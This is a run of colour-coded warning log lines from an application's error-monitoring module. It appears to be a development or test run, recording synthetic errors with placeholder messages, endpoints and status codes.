WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.853999Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3098'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.854088Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3099'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.854168Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3100'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.854275Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3101'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.854352Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3102'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.854409Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3103'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.854463Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3104'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.854521Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3105'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.854574Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3106'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.854625Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3107'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.854675Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3108'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.854724Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3109'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.854773Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3110'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.854822Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3111'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.854872Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3112'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.854920Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3113'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.854969Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3114'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855017Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3115'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855067Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3116'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855115Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3117'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855163Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3118'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855211Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3119'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855258Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3120'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855305Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3121'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855354Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3122'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855402Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3123'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855450Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3124'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855497Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3125'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855569Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3126'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855659Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3127'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855720Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3128'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855775Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3129'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855827Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3130'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855908Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3131'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.855990Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3132'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856053Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3133'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856106Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3134'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856156Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3135'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856205Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3136'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.856253Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m63[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3137'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
